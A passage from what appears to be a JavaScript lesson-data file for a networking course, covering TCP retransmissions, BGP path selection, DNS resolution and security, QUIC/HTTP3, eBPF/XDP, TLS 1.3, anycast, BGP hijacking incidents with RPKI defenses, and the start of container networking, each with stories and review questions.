- **RTO Retransmit** — timeout expires, no ACKs at all (bad, slow recovery)
- **Spurious Retransmit** — packet wasn't really lost, just delayed (wastes bandwidth)

**Measuring RTT in Wireshark:**
- Filter: \`tcp.analysis.ack_rtt\`
- Statistics → TCP Stream Graphs → Round Trip Time
- Normal LAN: 0.1–1ms | Same city: 1–5ms | Cross-continent: 50–150ms

**The math of latency:**
- 1 retransmission at 200ms RTT = 200ms added delay
- With RTO backoff: 1st retry 200ms, 2nd retry 400ms, 3rd retry 800ms
- 1% packet loss on 100ms RTT link → throughput drops by ~30%

**Practical Wireshark workflow:**
1. Capture traffic on the slow connection
2. Filter to the specific TCP stream: \`tcp.stream eq 5\`
3. Check for retransmissions and high RTT
4. Look at CWND graph — is it sawtoothing (congestion) or flat (application limit)?
5. Check TIME_WAIT states — too many means connection reuse is broken`
      },
      {
        titleEn: "Story: $2 Million in Latency",
        contentEn: `{story}

**The $2 Million Latency Bug**

A trading company noticed their order execution was 50ms slower than competitors. In high-frequency trading, 50ms is an eternity.

**The investigation:**
- Network team said "the network is fine" — ping was 2ms
- Application team said "the app is fine" — logs showed fast processing
- Everyone blamed everyone else

**A Wireshark capture revealed the truth:**
- TCP connections were being established fresh for every trade
- Each TCP handshake = 3 packets = 1.5 RTT = 3ms
- But TLS handshake on top = 2 more RTT = 4ms
- Plus TCP Slow Start meant first few packets were throttled
- Total overhead per trade: ~15ms
- Under load, retransmissions added another 20-35ms

**The fix:**
- Connection pooling — reuse TCP connections (saved 7ms)
- TLS session resumption — skip full handshake (saved 4ms)
- TCP tuning — larger initial CWND (saved 4ms)
- Total saving: ~15ms per trade

**The cost before the fix:**
- 50ms slower × 40,000 trades/day × average $1 missed profit = ~$2M/year

**Lesson:** Wireshark doesn't lie. When everyone says "it's not my problem," capture the packets. The truth is always in the wire.

{thinkOutside}
You have a web app that loads slowly. Users complain about 3-second page loads. The server processes requests in 50ms. Where would you capture packets, and what would you look for?`
      }
    ]
  },

  302: {
    titleEn: "BGP — The Internet's Routing Protocol",
    pages: [
      {
        titleEn: "iBGP vs eBGP — How the Internet Routes",
        contentEn: `**BGP (Border Gateway Protocol)** is how the internet works. Every ISP, cloud provider, and large company uses it.

**Two types:**

| Feature | iBGP | eBGP |
|---|---|---|
| Between | Routers in SAME AS | Routers in DIFFERENT AS |
| AS = | Autonomous System (one organization) | — |
| TTL | 255 (multihop OK) | 1 (direct neighbor only, unless multihop set) |
| Next-hop | Does NOT change | Changes to peer's address |
| Full mesh? | Required (or use Route Reflector) | No, just peer with neighbor |
| AD value | 200 (less trusted) | 20 (more trusted) |

**AS (Autonomous System):**
- Every ISP/org gets an AS Number (ASN)
- Example: Google = AS15169, Cloudflare = AS13335
- AS numbers are assigned by IANA → RIRs (ARIN, RIPE, etc.)

**BGP is a path-vector protocol:**
- Each route carries the full AS path: "to reach 8.8.8.0/24, go through AS3356 → AS15169"
- Loop prevention: if a router sees its own ASN in the path, it drops the route
- No automatic discovery — you manually configure each neighbor

**BGP messages:**
- **OPEN** — start session, exchange AS numbers and capabilities
- **UPDATE** — announce new routes or withdraw old ones
- **KEEPALIVE** — "I'm still here" (every 60 seconds)
- **NOTIFICATION** — error, session will close`
      },
      {
        titleEn: "Path Selection — 13 Criteria",
        contentEn: `When BGP has multiple paths to the same destination, it picks the best one. The selection follows a strict order — first match wins.

**BGP Best Path Selection (in order):**

| # | Criteria | Higher or Lower wins? | Who controls it? |
|---|---|---|---|
| 1 | **Weight** | Higher wins | Local router only (Cisco proprietary) |
| 2 | **Local Preference** | Higher wins | Your AS (iBGP) |
| 3 | **Locally originated** | Self-originated wins | Local router |
| 4 | **AS Path length** | Shorter wins | All ASes in path |
| 5 | **Origin type** | IGP < EGP < Incomplete | Origin AS |
| 6 | **MED** (Multi-Exit Discriminator) | Lower wins | Neighbor AS (suggestion) |
| 7 | **eBGP over iBGP** | eBGP wins | Topology |
| 8 | **Lowest IGP metric** | Lower wins | Internal routing |
| 9 | **Oldest route** | Older wins | Stability |
| 10 | **Lowest Router ID** | Lower wins | Router config |
| 11 | **Shortest cluster list** | Shorter wins | Route Reflectors |
| 12 | **Lowest neighbor address** | Lower wins | Peer IP |
| 13 | **Lowest peer Router ID** | Lower wins | Peer config |

**The ones that matter most (daily use):**
- **Weight** — override everything locally (lab/emergency)
- **Local Preference** — "our AS prefers this path" (most common tuning)
- **AS Path** — prepend your ASN multiple times to make a path look longer (traffic engineering)
- **MED** — "dear neighbor, please enter our network through this link"

**Example:**
- You have two ISPs: ISP-A (cheap) and ISP-B (fast)
- Set Local Preference 200 for ISP-B routes → all outbound traffic uses ISP-B
- Prepend your ASN on ISP-A announcements → inbound traffic prefers ISP-B`
      },
      {
        titleEn: "Story: Pakistan Took Down YouTube (2008)",
        contentEn: `{story}

**February 24, 2008 — Pakistan Telecom hijacks YouTube**

The Pakistan government ordered ISPs to block YouTube (over a controversial video).

**What Pakistan Telecom did:**
- YouTube's IP range: 208.65.153.0/24
- Pakistan Telecom announced a MORE SPECIFIC route: 208.65.153.0/25
- BGP rule: more specific prefix always wins (a /25 beats a /24)

**What happened next:**
- Pakistan Telecom's route leaked to their upstream provider (PCCW, AS3491)
- PCCW accepted it and announced it to the entire internet
- Within 2 minutes, most of the world's traffic to YouTube went to Pakistan
- Pakistan Telecom had no YouTube servers → black hole
- **YouTube was down worldwide for about 2 hours**

**The fix (manual):**
- YouTube announced even more specific routes: two /25s covering their /24
- Engineers contacted PCCW to filter the fake route
- Service restored after ~2 hours

**Why BGP allowed this:**
- BGP is built on **trust** — there was no verification in 2008
- Any AS could announce any prefix
- No one checked if Pakistan Telecom actually owned 208.65.153.0/24

**What changed after:**
- **RPKI (Resource Public Key Infrastructure)** — cryptographic proof of prefix ownership
- **IRR (Internet Routing Registry)** — databases of who owns what
- **BGP communities** — signal intent ("don't export this route")
- But adoption is still slow — in 2024, only ~50% of routes are RPKI-signed

{questions}
1. Why does a /25 route win over a /24 for the same IP space?
2. If you run an AS and want to protect against hijacking, what two things should you set up?
3. Why can't BGP just reject routes from ASes that don't own the prefix?`
      }
    ]
  },

  303: {
    titleEn: "DNS Deep Dive",
    pages: [
      {
        titleEn: "Recursive Resolution — Every Step",
        contentEn: `When you type **www.example.com** in your browser, here is exactly what happens.

**The 5 actors:**
1. **Your computer** (stub resolver) — asks, doesn't resolve itself
2. **Recursive resolver** (ISP or 8.8.8.8) — does all the work
3. **Root nameserver** — knows where .com/.org/.net live (13 root server clusters)
4. **TLD nameserver** — knows where example.com's nameserver is
5. **Authoritative nameserver** — has the actual answer

**Step by step — resolving www.example.com:**

\`\`\`
1. Browser → OS cache → not found
2. OS → Recursive resolver (e.g., 8.8.8.8): "what is www.example.com?"
3. Resolver checks its cache → not found
4. Resolver → Root server (a.root-servers.net): "what is www.example.com?"
   Root says: "I don't know, but .com is handled by a.gtld-servers.net"
5. Resolver → TLD server (a.gtld-servers.net): "what is www.example.com?"
   TLD says: "example.com uses ns1.example.com (93.184.216.34)"
6. Resolver → Authoritative (ns1.example.com): "what is www.example.com?"
   Auth says: "www.example.com = 93.184.216.34, TTL=3600"
7. Resolver caches the answer for 3600 seconds
8. Resolver → Your computer: "93.184.216.34"
9. Browser connects to 93.184.216.34
\`\`\`

**Record types:**
- **A** — domain → IPv4 address
- **AAAA** — domain → IPv6 address
- **CNAME** — domain → another domain (alias)
- **MX** — domain → mail server
- **NS** — domain → nameserver
- **TXT** — arbitrary text (SPF, DKIM, verification)
- **SOA** — zone metadata (serial, refresh, retry, expire)`
      },
      {
        titleEn: "DNS Security — DNSSEC, DoH, DoT",
        contentEn: `**DNS was designed without security.** Everything is plaintext. Anyone can forge responses.

**Three security layers:**

**1. DNSSEC (DNS Security Extensions):**
- Adds **digital signatures** to DNS responses
- Chain of trust: Root → .com → example.com (each signs the next)
- New record types: RRSIG (signature), DNSKEY (public key), DS (delegation signer)
- Protects against: **forged responses** (cache poisoning)
- Does NOT encrypt — queries are still visible
- Does NOT protect against: snooping on your queries

**2. DoH (DNS over HTTPS):**
- DNS queries inside normal HTTPS (port 443)
- Looks like regular web traffic — hard to block or snoop
- Used by: Firefox (Cloudflare), Chrome (Google), browsers
- Protects against: **ISP snooping**, network-level blocking
- Controversy: bypasses corporate/parental DNS filters

**3. DoT (DNS over TLS):**
- DNS queries encrypted with TLS (port 853)
- Dedicated port — easy to identify and block
- Used by: Android (Private DNS), system-level resolvers
- Protects against: **snooping** (same as DoH)
- Easier for admins to manage than DoH

**Comparison:**

| Feature | Plain DNS | DNSSEC | DoH | DoT |
|---|---|---|---|---|
| Encrypted? | No | No | Yes | Yes |
| Verified? | No | Yes | No* | No* |
| Port | 53 | 53 | 443 | 853 |
| Blockable? | Yes | Yes | Hard | Easy |

*DoH/DoT can use DNSSEC too — they're complementary.`
      },
      {
        titleEn: "Story: ISP DNS Hijacking",
        contentEn: `{story}

**How ISPs Secretly Redirected Your Web Traffic**

In the late 2000s, many ISPs discovered a way to make money from your typos.

**Normal behavior:**
- You type "gogle.com" (typo) in browser
- DNS resolver returns NXDOMAIN (domain not found)
- Browser shows error page

**What ISPs did:**
- Instead of returning NXDOMAIN, they returned their OWN IP address
- Your browser loaded the ISP's search page — full of ads
- ISP earned ad revenue from your mistakes
- Some ISPs did this for ALL failed DNS queries

**It got worse:**
- Some ISPs injected ads into ANY HTTP page (not just errors)
- They modified DNS responses to redirect through their proxy
- The proxy added ad banners to pages you visited
- This broke many applications that relied on NXDOMAIN responses

**Real examples:**
- **Comcast (2009)** — redirected NXDOMAIN to search pages
- **Charter (2008)** — injected JavaScript ads into non-customer pages
- **Multiple ISPs in Asia** — full DNS hijacking for ad injection

**Why it worked:**
- DNS is plaintext on port 53
- ISP controls the recursive resolver
- Most users use their ISP's default DNS

**How users fought back:**
- Switched to 8.8.8.8 (Google) or 1.1.1.1 (Cloudflare)
- Enabled DoH/DoT — ISP can't modify encrypted DNS
- DNSSEC adoption increased — forged responses are rejected

**The bigger lesson:**
- Your ISP can see and modify ALL your plaintext DNS queries
- This is why encrypted DNS (DoH/DoT) matters
- "If you don't control your DNS, you don't control your internet"

{simulation}
You are a network admin. A user reports that typing any non-existent domain shows a strange search page instead of an error. The user is using the company DNS server (192.168.1.1). What steps do you take to diagnose this? What could cause it?`
      }
    ]
  },

  304: {
    titleEn: "QUIC and HTTP/3",
    pages: [
      {
        titleEn: "The Problem HTTP/2 Didn't Solve",
        contentEn: `**HTTP/2 fixed many things. But one critical problem remained: Head-of-Line (HOL) blocking at the TCP layer.**

**What HTTP/2 gave us:**
- Multiplexing — multiple requests on one TCP connection
- Header compression (HPACK)
- Server push
- Stream prioritization

**The HOL blocking problem:**

\`\`\`
HTTP/2 multiplexes streams over ONE TCP connection:

Stream 1: [packet A] [packet B] [packet C]
Stream 2: [packet D] [packet E] [packet F]
Stream 3: [packet G] [packet H] [packet I]

All mixed into one TCP byte stream:
TCP: [A][D][G][B][E][H][C][F][I]

If packet D is lost:
TCP: [A][ ? ][G][B][E][H][C][F][I]
              ↑ TCP stops HERE — waits for D to be retransmitted
              Streams 1 and 3 are BLOCKED even though their packets arrived fine
\`\`\`

**Why this happens:**
- TCP guarantees **in-order delivery** of bytes
- TCP doesn't know about HTTP/2 streams
- One lost packet blocks ALL streams on that connection
- On lossy networks (mobile, Wi-Fi), this happens often

**The irony:**
- HTTP/1.1 used 6 parallel TCP connections → loss on one didn't block others
- HTTP/2 uses 1 TCP connection → loss blocks everything
- On lossy networks, HTTP/2 can be SLOWER than HTTP/1.1

**This is why QUIC was created:**
- QUIC runs over UDP (not TCP)
- Each stream is independent — loss in one stream doesn't block others
- QUIC handles reliability per-stream, not per-connection`
      },
      {
        titleEn: "QUIC — 0-RTT and Connection Migration",
        contentEn: `**QUIC = UDP + reliability + encryption + multiplexing. All built-in.**

**Key features:**

**1. 0-RTT Connection Setup:**
\`\`\`
TCP + TLS 1.3:          QUIC (first time):       QUIC (repeat):
Client → SYN            Client → Initial         Client → 0-RTT data
Server → SYN+ACK        (crypto + data combined)  (send data immediately!)
Client → ACK            Server → Handshake        Server → response
Client → ClientHello    Client → ready
Server → ServerHello    = 1 RTT total             = 0 RTT total
Client → ready
= 3 RTT total
\`\`\`

- First connection: 1 RTT (TLS handshake + transport setup combined)
- Repeat connection: 0 RTT (send data in the first packet!)
- TCP+TLS needs 2-3 RTT before sending any data

**2. No HOL Blocking:**
- Each QUIC stream has its own sequence numbers
- Lost packet in Stream 2 → only Stream 2 waits
- Streams 1 and 3 continue without delay

**3. Connection Migration:**
- TCP connection = (source IP, source port, dest IP, dest port)
- Change Wi-Fi → 4G? New IP = new TCP connection = start over
- QUIC uses a **Connection ID** instead
- Switch networks → same Connection ID → connection continues
- Your video call doesn't drop when you walk from Wi-Fi to cellular

**4. Always Encrypted:**
- TLS 1.3 is built into QUIC — not optional
- Even packet headers are partially encrypted
- Middleboxes (firewalls, NATs) can't inspect or modify QUIC traffic

**QUIC vs TCP comparison:**

| Feature | TCP + TLS | QUIC |
|---|---|---|
| Transport | TCP (kernel) | UDP (userspace) |
| Encryption | Optional (TLS on top) | Built-in (always TLS 1.3) |
| Handshake | 2-3 RTT | 1 RTT (0 RTT repeat) |
| HOL blocking | Yes (connection level) | No (stream level) |
| Connection migration | No | Yes (Connection ID) |
| Deployed by | OS kernel update | Application update |`
      },
      {
        titleEn: "Story: Google Built QUIC Quietly",
        contentEn: `{story}

**How Google Shipped a New Internet Protocol Without Anyone Noticing**

In 2012, Google had a problem. TCP was too slow for their services, especially on mobile networks. But changing TCP meant changing every operating system kernel in the world.

**Google's clever solution:**
- Build a new protocol on top of **UDP**
- UDP is simple — the kernel just passes packets through
- All the logic lives in **userspace** (Chrome browser + Google servers)
- No kernel changes needed. No OS updates needed.

**The timeline:**
- **2012** — Jim Roskind at Google starts QUIC experiment
- **2013** — QUIC enabled in Chrome (hidden, experimental)
- **2014** — Google silently routes Chrome → Google services over QUIC
- By 2015, **~50% of Chrome-to-Google traffic** used QUIC
- Most users had no idea they were using a new protocol

**Why no one noticed:**
- QUIC uses UDP port 443 — firewalls already allow it
- If QUIC fails, Chrome falls back to TCP automatically
- Pages loaded faster — users just thought "Google is fast"
- No installation, no configuration, no user action needed

**The results:**
- Search: 8% faster page loads
- YouTube: 15% fewer rebuffers (buffering events)
- On lossy mobile networks: 30% faster than TCP
- Google proved QUIC worked at scale with billions of users

**From Google experiment to internet standard:**
- **2016** — IETF starts standardizing QUIC (based on Google's design)
- **2021** — RFC 9000: QUIC is an official internet standard
- **2022** — RFC 9114: HTTP/3 (HTTP over QUIC) is standardized
- Today: ~30% of all web traffic uses QUIC/HTTP3

**Lesson:** Sometimes the best way to change the internet is to ship it inside a browser update and let users discover the speed improvement on their own.

{thinkOutside}
QUIC runs over UDP. Many corporate firewalls block all UDP except DNS (port 53). How would you handle deploying HTTP/3 in an enterprise environment where UDP 443 might be blocked?`
      }
    ]
  },

  305: {
    titleEn: "eBPF — Programming the Kernel from Outside",
    pages: [
      {
        titleEn: "What is eBPF?",
        contentEn: `**eBPF (extended Berkeley Packet Filter)** lets you run custom programs inside the Linux kernel — safely, without modifying kernel code.

**The problem eBPF solves:**
- Want to add a firewall rule? Modify kernel module → recompile → reboot
- Want to trace a function? Load a kernel module → risk crashing the system
- Want custom networking? Write kernel code → wait years for it to ship in a distro

**eBPF approach:**
- Write a small program in C (or Rust)
- Compile it to eBPF bytecode
- Load it into the kernel at runtime — no reboot, no kernel rebuild

**The safety model — Verifier + JIT:**

\`\`\`
Your eBPF program
       ↓
   [Verifier] — checks BEFORE loading:
   ✓ No infinite loops (bounded loops only)
   ✓ No out-of-bounds memory access
   ✓ No null pointer dereference
   ✓ Program terminates (max instruction count)
   ✓ Only allowed kernel functions (helpers)
       ↓
   [JIT Compiler] — converts bytecode to native machine code
       ↓
   Runs at kernel speed (not interpreted)
\`\`\`

**Where can eBPF programs attach?**
- **Network** — XDP (packet arrives at NIC), TC (traffic control), socket
- **Tracing** — kprobes (any kernel function), tracepoints, uprobes (userspace)
- **Security** — LSM hooks (file access, process execution)
- **Scheduling** — CPU scheduler (Linux 6.6+)

**eBPF Maps — shared data:**
- Key-value stores shared between eBPF programs and userspace
- Types: hash map, array, ring buffer, LRU cache, per-CPU arrays
- Example: count packets per IP → eBPF program updates map → userspace reads map`
      },
      {
        titleEn: "XDP and Cilium — Real Use Cases",
        contentEn: `**XDP (eXpress Data Path)** — process packets at the earliest possible point.

**How XDP works:**
\`\`\`
Packet arrives at NIC
       ↓
   [XDP program runs HERE] ← before kernel networking stack
       ↓
   Decision:
   XDP_PASS  → continue to kernel stack (normal processing)
   XDP_DROP  → drop packet immediately (never enters kernel)
   XDP_TX    → send packet back out same NIC (bounce)
   XDP_REDIRECT → send to different NIC or CPU
\`\`\`

**Why XDP is so fast:**
- Runs before memory allocation for the packet (no sk_buff)
- Runs before any kernel networking code
- Can process **millions of packets per second per CPU core**
- 10x faster than iptables for packet filtering

**Cilium — Kubernetes networking with eBPF:**

Traditional K8s networking:
\`\`\`
Pod A → veth → bridge → iptables (100s of rules) → bridge → veth → Pod B
\`\`\`

Cilium with eBPF:
\`\`\`
Pod A → eBPF program → Pod B  (direct, no iptables)
\`\`\`

**What Cilium provides:**
- **Networking** — pod-to-pod, service load balancing (replaces kube-proxy)
- **Security** — L3/L4/L7 network policies (can filter by HTTP path!)
- **Observability** — Hubble: network flow logs without sidecar proxies
- **Encryption** — transparent WireGuard encryption between nodes

**The iptables problem Cilium solves:**
- 1000 Kubernetes services = ~20,000 iptables rules
- iptables is O(n) — checks rules one by one
- eBPF hash maps are O(1) — direct lookup
- At scale: 10x–100x faster than iptables`
      },
      {
        titleEn: "Story: Cloudflare Stops 800 Gbps DDoS with eBPF",
        contentEn: `{story}

**How Cloudflare Uses eBPF to Block Massive DDoS Attacks**

Cloudflare handles some of the largest DDoS attacks in history. Their secret weapon? XDP + eBPF.

**The challenge:**
- DDoS attacks can be 500 Gbps – 2+ Tbps
- Traditional firewalls can't process packets fast enough
- iptables at this scale = 100% CPU usage = server dies
- You need to drop bad packets BEFORE they consume resources

**Cloudflare's architecture:**
1. **XDP programs** run at the NIC driver level
2. Each packet is checked against eBPF maps containing attack signatures
3. Bad packets are dropped with XDP_DROP — never enter the kernel
4. Good packets pass through to the application
5. Attack patterns are updated in real-time (no restart needed)

**Real incident — 800 Gbps attack:**
- Attack: UDP flood from ~300,000 source IPs
- XDP program checked each packet against a Bloom filter in eBPF map
- Dropped 99.7% of attack traffic at line speed
- Server CPU stayed under 10%
- Legitimate users noticed nothing

**Why eBPF was the right tool:**
- **Speed** — XDP processes before kernel allocates memory for the packet
- **Flexibility** — update attack rules without restarting anything
- **Safety** — verifier ensures eBPF programs can't crash the kernel
- **Programmable** — can match complex patterns (not just IP/port)

**Their tool: xdpcap**
- Like tcpdump but for XDP
- Captures packets that XDP programs are dropping
- Useful for debugging: "why is this packet being dropped?"

**Scale:**
- Cloudflare runs eBPF on every server in 300+ data centers
- Each server can drop 10M+ packets/second with XDP
- Combined capacity: can absorb multi-Tbps attacks

{questions}
1. Why is XDP faster than iptables for dropping packets?
2. What is the role of the eBPF verifier? Why is it critical for security?
3. A company uses 5000 iptables rules for firewall. How would migrating to eBPF improve performance?`
      }
    ]
  },

  306: {
    titleEn: "TLS 1.3 — Modern Encryption",
    pages: [
      {
        titleEn: "TLS 1.2 vs 1.3 — What Changed",
        contentEn: `**TLS 1.3 (RFC 8446, 2018) removed everything that was broken or slow in TLS 1.2.**

**Removed from TLS 1.3:**
- RSA key exchange (no forward secrecy)
- CBC mode ciphers (BEAST, Lucky13 attacks)
- RC4, DES, 3DES (weak ciphers)
- SHA-1 (broken hash)
- Compression (CRIME attack)
- Renegotiation (complexity, attack surface)
- Custom DHE groups (weak parameters possible)
- Static RSA/DH (no forward secrecy)
- ChangeCipherSpec message (unnecessary)

**TLS 1.2 had ~37 cipher suites. TLS 1.3 has only 5:**

| Cipher Suite | Encryption | Hash |
|---|---|---|
| TLS_AES_256_GCM_SHA384 | AES-256-GCM | SHA-384 |
| TLS_AES_128_GCM_SHA256 | AES-128-GCM | SHA-256 |
| TLS_CHACHA20_POLY1305_SHA256 | ChaCha20-Poly1305 | SHA-256 |
| TLS_AES_128_CCM_SHA256 | AES-128-CCM | SHA-256 |
| TLS_AES_128_CCM_8_SHA256 | AES-128-CCM-8 | SHA-256 |

**Key differences:**
- All TLS 1.3 ciphers use **AEAD** (Authenticated Encryption with Associated Data)
- Key exchange is ALWAYS Diffie-Hellman (ECDHE or DHE) — RSA key exchange removed
- This means **forward secrecy is mandatory** — not optional like in TLS 1.2
- Fewer choices = fewer configuration mistakes = more secure by default

**Why removing RSA key exchange matters:**
- TLS 1.2 with RSA: server's private key decrypts ALL past sessions
- Steal the key → decrypt years of recorded traffic
- TLS 1.3 with ECDHE: each session has unique keys
- Steal the key → can't decrypt past sessions (forward secrecy)`
      },
      {
        titleEn: "1-RTT Handshake — How It Works",
        contentEn: `**TLS 1.3 combines the TLS and key exchange into a single round trip.**

**TLS 1.2 Handshake (2-RTT):**
\`\`\`
Client                              Server
  |--- ClientHello ------------------->|  RTT 1
  |<-- ServerHello + Certificate ------|
  |--- Key Exchange + Finished ------->|  RTT 2
  |<-- Finished -----------------------|
  |--- Application Data ------------->|  RTT 3 (first data!)
\`\`\`

**TLS 1.3 Handshake (1-RTT):**
\`\`\`
Client                              Server
  |--- ClientHello ------------------>|
  |    + key_share (ECDHE public key) |
  |    + supported_versions (1.3)     |  RTT 1
  |<-- ServerHello -------------------|
  |    + key_share (ECDHE public key) |
  |    + {Certificate}               |
  |    + {CertificateVerify}         |
  |    + {Finished}                  |
  |--- {Finished} ------------------->|
  |--- Application Data ------------>|  RTT 1 (first data!)
\`\`\`
{} = encrypted

**Why it's faster:**
- Client sends its ECDHE key share in the FIRST message (guesses the curve)
- Server responds with everything at once: its key, certificate, and finished
- Both sides can compute the shared secret after 1 round trip
- Application data can flow immediately after

**ECDHE (Elliptic Curve Diffie-Hellman Ephemeral):**
- Client generates random private key → computes public key on the curve
- Server generates random private key → computes public key on the curve
- Both compute the same shared secret (math magic of elliptic curves)
- **Ephemeral** = new keys every session → forward secrecy
- Common curves: X25519 (fast, safe), P-256 (widely supported)`
      },
      {
        titleEn: "Forward Secrecy and 0-RTT Resumption",
        contentEn: `**Forward secrecy means: compromise today doesn't reveal yesterday.**

**How forward secrecy works in TLS 1.3:**
\`\`\`
Session 1: Client key = random_A, Server key = random_B → shared secret_1
Session 2: Client key = random_C, Server key = random_D → shared secret_2
Session 3: Client key = random_E, Server key = random_F → shared secret_3

Each session uses NEW random keys.
Crack session 2? You only get session 2's data.
Sessions 1 and 3 are safe.
\`\`\`

**0-RTT Resumption (PSK):**
- After a successful TLS 1.3 handshake, server sends a **session ticket**
- Next connection: client sends the ticket + application data in the FIRST packet
- Server decrypts and responds immediately — **zero round trips** of latency

\`\`\`
Client                              Server
  |--- ClientHello ------------------>|
  |    + pre_shared_key (ticket)      |
  |    + early_data (0-RTT)           |  0 RTT — data sent immediately!
  |<-- ServerHello + Finished --------|
  |--- Finished --------------------->|
\`\`\`

**The 0-RTT security tradeoff:**
- 0-RTT data is **replayable** — an attacker can capture and resend it
- Safe for: GET requests (reading data)
- Dangerous for: POST requests (creating orders, transferring money)
- Servers must implement **anti-replay** mechanisms
- Many servers disable 0-RTT for non-idempotent requests

**Practical impact:**
- TLS 1.2 → 1.3: saves ~100ms on first connection (one less RTT)
- 0-RTT resumption: saves ~200ms on repeat connections
- On mobile networks (150ms RTT): this is very noticeable`
      },
      {
        titleEn: "Practice — TLS 1.3 Deep Dive",
        contentEn: `{questions}

**Concept check:**

1. TLS 1.2 allowed RSA key exchange. TLS 1.3 removed it. Explain why in terms of forward secrecy.

2. TLS 1.3 has only 5 cipher suites, while TLS 1.2 had ~37. Why is fewer actually more secure?

3. Draw the TLS 1.3 1-RTT handshake from memory. Mark which messages are encrypted.

4. A banking website enables 0-RTT resumption for all requests. What is the security risk? What kind of requests should NOT use 0-RTT?

5. Explain ECDHE in simple terms: why does "ephemeral" matter?

{simulation}

**Scenario:** You are a security engineer. Your company's web server supports both TLS 1.2 and TLS 1.3. The CEO asks: "Why should we disable TLS 1.2? Everything works fine."

Write a brief explanation covering:
- What attacks are possible with TLS 1.2 that are impossible with TLS 1.3?
- What is the performance benefit?
- What might break if you disable TLS 1.2? (think about old clients)
- What is your recommendation?

{thinkOutside}

An attacker records all encrypted TLS 1.3 traffic between a user and a bank for 5 years. Then they steal the server's private RSA key. Can they decrypt the recorded traffic? Why or why not? What if it was TLS 1.2 with RSA key exchange?`
      }
    ]
  },

  307: {
    titleEn: "Anycast, BGP Hijacking, and RPKI",
    pages: [
      {
        titleEn: "Anycast Routing via BGP",
        contentEn: `**Anycast = one IP address, many servers around the world. BGP picks the closest one.**

**How it works:**
\`\`\`
Cloudflare DNS: 1.1.1.1

Server in London announces via BGP: "I have route to 1.1.1.1"
Server in Tokyo announces via BGP: "I have route to 1.1.1.1"
Server in New York announces via BGP: "I have route to 1.1.1.1"

User in Paris → BGP picks shortest AS path → routes to London
User in Seoul → BGP picks shortest AS path → routes to Tokyo
\`\`\`

**Why anycast works:**
- BGP naturally routes to the "closest" announcement (shortest AS path)
- No special protocol needed — just announce the same prefix from multiple locations
- Users are automatically sent to the nearest server

**Use cases:**
- **DNS** — all root servers use anycast (13 addresses, 1000+ actual servers)
- **CDN** — Cloudflare, AWS CloudFront, Google serve content via anycast
- **DDoS protection** — attack traffic is spread across all locations

**Anycast + DDoS:**
\`\`\`
Without anycast:           With anycast:
All attack traffic →       Attack traffic spread →
[Single server] 💀         [London] 15% of attack
                           [Tokyo] 10% of attack
                           [NYC] 20% of attack
                           [São Paulo] 15% of attack
                           ... each location handles a small portion
\`\`\`

**Limitations:**
- Works great for UDP (DNS) — each packet is independent
- TCP with anycast needs care — if BGP route changes mid-connection, packets go to a different server
- Solutions: ECMP pinning, QUIC Connection ID, flow-aware load balancing`
      },
      {
        titleEn: "BGP Hijacking and RPKI Protection",
        contentEn: `**BGP hijacking = announcing someone else's IP prefix as your own.**

**Types of BGP hijacking:**

| Type | Method | Effect |
|---|---|---|
| **Prefix hijack** | Announce exact same prefix | Traffic splits (some goes to attacker) |
| **Sub-prefix hijack** | Announce more specific prefix (/25 vs /24) | All traffic goes to attacker (longest match wins) |
| **AS path poisoning** | Fake shorter AS path | Traffic prefers attacker's "shorter" path |
| **Route leak** | Accidentally share internal routes externally | Traffic takes wrong path |

**What attackers can do with hijacked traffic:**
- **Black hole** — drop all traffic (denial of service)
- **Intercept** — read traffic, then forward to real destination (man-in-the-middle)
- **Impersonate** — serve fake content (phishing, malware)

**RPKI (Resource Public Key Infrastructure):**

\`\`\`
RPKI chain:
IANA → RIR (ARIN/RIPE) → ISP → signs ROA

ROA (Route Origin Authorization):
"AS13335 is authorized to announce 1.1.1.0/24"
  ↓ signed by ARIN's certificate

Router with RPKI validation:
- Receives BGP announcement: "AS9999 has route to 1.1.1.0/24"
- Checks RPKI: ROA says only AS13335 can announce this
- Result: INVALID → route rejected
\`\`\`

**RPKI validation states:**
- **Valid** — ROA exists and matches (accept)
- **Invalid** — ROA exists but doesn't match (reject)
- **Not Found** — no ROA exists (accept, but less trusted)

**Current adoption (2025):**
- ~55% of routes have ROAs
- ~35% of networks perform RPKI validation
- Growing fast — major incidents push adoption`
      },
      {
        titleEn: "Historical BGP Incidents",
        contentEn: `**Major BGP incidents that shaped internet routing security:**

| Year | Incident | What Happened | Impact | Duration |
|---|---|---|---|---|
| **2004** | TTNet (Turkey) | Announced 0.0.0.0/0 (default route) — "I'm the entire internet" | Internet disruption in parts of Europe | Hours |
| **2008** | Pakistan Telecom / YouTube | Announced YouTube's /25 to block it locally — leaked globally | YouTube down worldwide | ~2 hours |
| **2010** | China Telecom | Announced ~37,000 prefixes belonging to others | 15% of internet routed through China for 18 minutes | 18 min |
| **2017** | Google (accidental) | Leaked Japanese network prefixes to global BGP | Major internet outage in Japan | 1 hour |
| **2018** | eNet / Amazon DNS | Hijacked Route53 DNS IPs → redirected MyEtherWallet users | ~$150K cryptocurrency stolen | 2 hours |
| **2019** | China Telecom | Rerouted European mobile traffic through China | Potential interception of millions of users | 2 hours |
| **2020** | Rostelecom (Russia) | Hijacked prefixes of Google, Amazon, Cloudflare, Akamai | Traffic rerouted through Russia | 1 hour |
| **2022** | Russian ISPs | Multiple BGP hijacks during Ukraine conflict | Traffic interception attempts | Ongoing |
| **2024** | Orange Spain | Attacker gained RIPE account access, created bad ROAs | Major ISP routing disruption | Hours |

**Patterns in BGP incidents:**
- Most hijacks are **accidental** (configuration mistakes, route leaks)
- Intentional hijacks are often by **state actors** or for **financial gain**
- Impact is always fast (minutes) because BGP propagates quickly
- Recovery is slow (hours) because it requires manual intervention

**Defenses today:**
- **RPKI/ROA** — proves who owns a prefix
- **BGP communities** — signal "don't export" to prevent leaks
- **ASPA (AS Provider Authorization)** — new, proves AS relationships
- **BGP Flowspec** — distribute filtering rules via BGP
- **Monitoring** — RIPE RIS, BGPStream, Cloudflare Radar detect anomalies

{questions}
1. The 2008 Pakistan/YouTube incident used a sub-prefix hijack (/25 vs /24). Why does this always win in BGP routing?
2. The 2018 MyEtherWallet hijack combined BGP hijacking with DNS. Explain the attack chain.
3. If RPKI was fully deployed, which incidents in the table would it have prevented? Which would it NOT prevent?`
      }
    ]
  },

  308: {
    titleEn: "Container Networking",
    pages: [
      {
        titleEn: "Linux Network Namespaces",
        contentEn: `**Containers use Linux namespaces for isolation. Network namespaces give each container its own network stack.**

**What a network namespace provides:**
- Own network interfaces (eth0, lo)
- Own routing table
- Own iptables/nftables rules
- Own /proc/net
